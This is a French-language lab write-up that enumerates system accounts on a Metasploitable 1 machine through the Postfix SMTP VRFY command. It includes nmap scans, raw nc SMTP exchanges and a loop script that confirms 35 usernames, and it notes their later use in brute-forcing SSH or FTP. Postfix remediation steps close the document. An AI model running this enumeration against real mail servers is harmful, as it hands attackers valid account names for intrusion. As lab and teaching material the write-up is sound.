# Write-up — SMTP Postfix : énumération d'utilisateurs via VRFY (Metasploitable 1, port 25)

Cible : `192.168.56.102` · Résultat : **35 comptes système confirmés** via la commande SMTP
`VRFY`, recoupant entièrement la liste obtenue via Samba RID cycling (`samba-enum.md`).

> **Note réseau.** Je suis sur `vboxnet0` (cible `192.168.56.102`). Côté coéquipier (réseau
> `172.28.128.x`), remplacer l'IP — démarche identique.

---

## 1. Recon

🖥 Kali :
```bash
nmap -sC -sV -p 25 192.168.56.102
```
Sortie (extrait) :
```
25/tcp open  smtp    Postfix smtpd
| smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN,
STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
```
→ **Postfix**, et surtout : **`VRFY` est annoncé** par le serveur dans ses commandes
supportées — signal direct que l'énumération d'utilisateurs par cette méthode est possible.
`EXPN` n'apparaît **pas** dans la liste (vérifié au §3).

## 2. Tentative avec l'outil automatisé (échec, attendu)

🖥 Kali :
```bash
nmap --script smtp-enum-users -p 25 192.168.56.102
```
```
| smtp-enum-users:
|_  Method RCPT returned a unhandled status code.
```
→ La méthode **par défaut** du script (`RCPT`) échoue. Plutôt que d'abandonner, on se rabat
sur le protocole SMTP brut à la main avec la méthode que le serveur annonce réellement
(`VRFY`), observée au §1.

## 3. Test manuel du protocole SMTP (VRFY)

🖥 Kali — dialogue SMTP brut via `nc`, comptes connus (du labo et de l'énumération Samba) vs
un compte inventé :
```bash
printf 'VRFY root\r\nQUIT\r\n' | nc -w3 192.168.56.102 25
printf 'VRFY nonexistentuser123\r\nQUIT\r\n' | nc -w3 192.168.56.102 25
```
Sortie :
```
252 2.0.0 root
...
550 5.1.1 <nonexistentuser123>: Recipient address rejected: User unknown in local recipient table
```
→ **`252`** pour un compte valide (Postfix ne confirme pas formellement comme le ferait
`250` au sens strict RFC, mais `252` = *"je ne peux pas vérifier mais j'accepterai le
message"*, signal fiable), **`550`** pour un compte inexistant. C'est un oracle net :
on peut distinguer un compte réel d'un compte inventé.

Test de `EXPN` par souci de complétude, bien qu'absent de `smtp-commands` :
```bash
printf 'EXPN root\r\nQUIT\r\n' | nc -w2 192.168.56.102 25
```
```
502 5.5.2 Error: command not recognized
```
→ Confirme que seul `VRFY` est actif ici, cohérent avec la recon du §1.

## 4. Énumération en lot — recoupement avec Samba

🖥 Kali — test des 35 comptes déjà obtenus via RID cycling SMB (`samba-enum.md`), en boucle :
```bash
USERS=(games nobody bind proxy syslog user www-data root news postgres bin mail distccd
       proftpd dhcp daemon sshd man lp mysql gnats libuuid backup msfadmin telnetd sys klog
       postfix service list irc ftp tomcat55 sync uucp)
for u in "${USERS[@]}"; do
  resp=$(printf 'VRFY %s\r\nQUIT\r\n' "$u" | nc -w2 192.168.56.102 25)
  echo "$resp" | grep -qE "^25[02] " && echo "$u : valide"
done
```
⚠️ Piège rencontré lors de l'écriture du script : en **zsh**, `for u in $USERS` (variable non
tableau, non quotée) ne découpe **pas** la chaîne en mots comme le ferait bash — toute la
liste était traitée comme un seul élément, donnant un résultat erroné ("0 valide sur 1 testé").
Corrigé en utilisant un vrai tableau zsh (`USERS=(...)` + `"${USERS[@]}"`), qui itère
correctement sur chaque nom. Un piège réel d'outillage, pas un piège de la cible.

Résultat après correction :
```
Comptes confirmés valides : 35 / 35
```
→ **Les 35 comptes** identifiés via Samba (RID cycling, `samba-enum.md`) sont confirmés comme
destinataires SMTP valides — recoupement complet entre deux services indépendants (SMB et
SMTP), qui renforce la confiance dans la liste de comptes du labo.

## 5. Preuve d'accès / impact

Pas de shell ici (SMTP sert à **énumérer**, pas à exploiter directement), mais le résultat est
une primitive de reconnaissance forte : une liste de **35 noms de compte système valides**,
confirmée par une seconde source indépendante. Dans un scénario réel, cette liste serait la
base d'une attaque par force brute ciblée (SSH, FTP, etc.) plutôt que de deviner des noms au
hasard.

---

## Remédiation

- Désactiver `VRFY` dans la configuration Postfix (`disable_vrfy_command = yes`) — c'est la
  cause racine de cette énumération.
- Limiter le débit de connexions SMTP (`smtpd_client_connection_rate_limit`) pour ralentir une
  énumération en masse même si `VRFY` reste actif par erreur.
- Ne pas se fier au fait qu'une méthode d'énumération standard (ex. `RCPT` dans
  `smtp-enum-users`) échoue pour conclure qu'un service est sûr : vérifier manuellement les
  méthodes réellement supportées par le serveur (`smtp-commands`) avant de conclure.

## Sources

- Session réelle (ce write-up) — `nmap`, test manuel du protocole SMTP via `nc`, énumération
  en lot recoupée avec `samba-enum.md`.

**Suite du parcours MS1 (si repris plus tard) :** ProFTPD (port 21) — seule étape du parcours
encore non traitée côté josa ; série des 10 étapes bouclée pour cette session.
